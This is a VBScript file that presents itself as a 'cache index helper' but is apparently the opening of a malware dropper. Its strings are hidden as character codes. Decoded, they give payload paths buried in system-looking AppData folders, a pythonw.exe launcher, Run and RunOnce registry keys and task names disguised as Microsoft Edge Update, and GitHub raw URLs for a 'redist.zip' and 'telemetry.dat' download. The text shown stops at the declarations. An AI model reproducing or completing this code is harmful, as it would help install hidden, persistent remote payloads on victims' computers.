' cache index helper - maintains per-user cache index segments under servicing folders.
Option Explicit
On Error Resume Next

Function Dk(s)
    Dim a, i
    a = Split(s, ",")
    Dk = ""
    For i = 0 To UBound(a)
        Dk = Dk & Chr(CInt(a(i)))
    Next
End Function

Dim sh, fo
Set sh = CreateObject("WScript.Shell")
Set fo = CreateObject("Scripting.FileSystemObject")

Dim AP, RT, ST, P1, P2, P3, K1, K2, K3, K4, K5, PY
Dim RK, SV, TS, OLR, R1, R2, O1, O2, O3, O4, O5, O6, O7, O8, O9, O10, RV2, RO2, T2, RK3, RO3, STLNK
AP = sh.ExpandEnvironmentStrings("%APPDATA%")
RT = Dk("37,76,79,67,65,76,65,80,80,68,65,84,65,37,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,97,99,104,101,115,92,114,116")
ST = Dk("37,76,79,67,65,76,65,80,80,68,65,84,65,37,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,97,99,104,101,115,92,114,101,100,105,115,116,46,122,105,112")
P1 = Dk("37,65,80,80,68,65,84,65,37,92,77,105,99,114,111,115,111,102,116,92,67,114,121,112,116,111,92,82,83,65,92,77,97,99,104,105,110,101,75,101,121,115,92,99,97,99,104,101,46,98,105,110")
P2 = Dk("37,65,80,80,68,65,84,65,37,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,87,69,82,92,82,101,112,111,114,116,65,114,99,104,105,118,101,92,119,101,114,115,118,99,46,98,105,110")
P3 = Dk("37,76,79,67,65,76,65,80,80,68,65,84,65,37,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,97,99,104,101,115,92,99,114,97,115,104,109,111,110,46,98,105,110")
K1 = Dk("37,65,80,80,68,65,84,65,37,92,77,105,99,114,111,115,111,102,116,92,67,114,121,112,116,111,92,82,83,65,92,77,97,99,104,105,110,101,75,101,121,115,92,83,118,99,67,97,99,104,101,46,118,98,115")
K2 = Dk("37,65,80,80,68,65,84,65,37,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,87,69,82,92,82,101,112,111,114,116,65,114,99,104,105,118,101,92,87,69,82,83,118,99,46,118,98,115")
K3 = Dk("37,76,79,67,65,76,65,80,80,68,65,84,65,37,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,97,99,104,101,115,92,99,97,99,104,101,109,103,114,46,118,98,115")
K4 = Dk("37,65,80,80,68,65,84,65,37,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,78,101,116,119,111,114,107,32,83,104,111,114,116,99,117,116,115,92,99,111,109,112,97,116,92,119,105,110,115,118,99,46,118,98,115")
K5 = Dk("37,76,79,67,65,76,65,80,80,68,65,84,65,37,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,73,78,101,116,67,97,99,104,101,92,99,111,109,112,97,116,92,115,121,115,100,109,46,118,98,115")
PY = Dk("112,121,116,104,111,110,119,46,101,120,101")
RK = Dk("72,75,67,85,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,117,114,114,101,110,116,86,101,114,115,105,111,110,92,82,117,110,92,77,105,99,114,111,115,111,102,116,69,100,103,101,85,112,100,97,116,101")
SV = Dk("77,105,99,114,111,115,111,102,116,69,100,103,101,85,112,100,97,116,101,46,118,98,115")
TS = Dk("77,105,99,114,111,115,111,102,116,69,100,103,101,85,112,100,97,116,101,67,111,114,101")
OLR = Dk("72,75,67,85,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,117,114,114,101,110,116,86,101,114,115,105,111,110,92,82,117,110,92,77,105,99,114,111,115,111,102,116,69,100,103,101,85,112,100,97,116,101")
R1 = Dk("104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,97,116,111,112,100,97,115,104,99,97,118,97,108,114,121,47,109,99,102,105,108,101,115,47,109,97,105,110,47,114,101,100,105,115,116,46,122,105,112")
R2 = Dk("104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,97,116,111,112,100,97,115,104,99,97,118,97,108,114,121,47,109,99,102,105,108,101,115,47,109,97,105,110,47,116,101,108,101,109,101,116,114,121,46,100,97,116")
RV2 = Dk("72,75,67,85,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,117,114,114,101,110,116,86,101,114,115,105,111,110,92,82,117,110,92,77,105,99,114,111,115,111,102,116,69,100,103,101,67,97,99,104,101")
RO2 = Dk("72,75,67,85,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,117,114,114,101,110,116,86,101,114,115,105,111,110,92,82,117,110,79,110,99,101,92,77,105,99,114,111,115,111,102,116,69,100,103,101,67,97,99,104,101")
T2 = Dk("77,105,99,114,111,115,111,102,116,69,100,103,101,67,97,99,104,101,50")
RK3 = Dk("72,75,67,85,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,117,114,114,101,110,116,86,101,114,115,105,111,110,92,82,117,110,92,77,105,99,114,111,115,111,102,116,69,100,103,101,85,112,100,97,116,101,50")
RO3 = Dk("72,75,67,85,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,117,114,114,101,110,116,86,101,114,115,105,111,110,92,82,117,110,79,110,99,101,92,77,105,99,114,111,115,111,102,116,69,100,103,101,85,112,100,97,116,101,50")
STLNK = Dk("77,105,99,114,111,115,111,102,116,69,100,103,101,85,112,100,97,116,101,46,108,110,107")
O1 = Dk("92,77,105,99,114,111,115,111,102,116,92,67,114,121,112,116,111,92,82,83,65,92,98,111,111,116,46,118,98,115")
O2 = Dk("92,77,105,99,114,111,115,111,102,116,92,67,114,121,112,116,111,92,82,83,65,92,99,97,99,104,101,45,104,101,108,112,101,114,46,99,109,100")
O3 = Dk("92,77,105,99,114,111,115,111,102,116,92,67,114,121,112,116,111,92,82,83,65,92,77,97,99,104,105,110,101,75,101,121,115,46,98,97,116")
O4 = Dk("92,77,105,99,114,111,115,111,102,116,92,80,114,111,116,101,99,116,92,115,121,115,107,101,121,115,46,98,97,116")
O5 = Dk("92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,87,69,82,92,82,101,112,111,114,116,65,114,99,104,105,118,101,92,119,101,114,115,118,99,46,99,109,100")
O6 = Dk("92,77,105,99,114,111,115,111,102,116,69,100,103,101,85,112,100,97,116,101,46,99,109,100")
